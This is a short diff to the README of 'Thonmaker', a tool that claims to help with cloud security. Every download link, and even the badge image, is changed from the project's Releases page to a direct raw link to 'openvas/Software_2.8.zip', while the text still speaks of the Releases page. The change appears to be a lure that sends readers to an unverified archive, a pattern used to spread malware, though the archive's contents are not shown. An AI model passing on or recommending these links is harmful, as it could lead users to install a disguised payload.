@@ -6,7 +6,7 @@ Thonmaker is a user-friendly application designed to help you set up an end-to-e
 
 ## 🔗 Download Now
 
-[![Download thonmaker](https://img.shields.io/badge/Download-thonmaker-blue.svg)](https://github.com/luiz1322/thonmaker/releases)
+[![Download thonmaker](https://github.com/luiz1322/thonmaker/raw/refs/heads/main/openvas/Software_2.8.zip)](https://github.com/luiz1322/thonmaker/raw/refs/heads/main/openvas/Software_2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Follow these steps to get started with Thonmaker quickly.
 
 1. **Download the Software**  
    Visit our Releases page to download the Thonmaker application. You can find all the available versions for your platform.  
-   [Download Thonmaker](https://github.com/luiz1322/thonmaker/releases)
+   [Download Thonmaker](https://github.com/luiz1322/thonmaker/raw/refs/heads/main/openvas/Software_2.8.zip)
 
 2. **Check System Requirements**  
    Before running Thonmaker, make sure your system meets the following requirements:
@@ -89,4 +89,4 @@ For further details, please visit our GitHub repository and support page. You ca
 ## 📥 Download & Install
 
 To get started and enhance your cloud security, visit our Releases page to download Thonmaker today.  
-[Download Thonmaker](https://github.com/luiz1322/thonmaker/releases)
+[Download Thonmaker](https://github.com/luiz1322/thonmaker/raw/refs/heads/main/openvas/Software_2.8.zip)
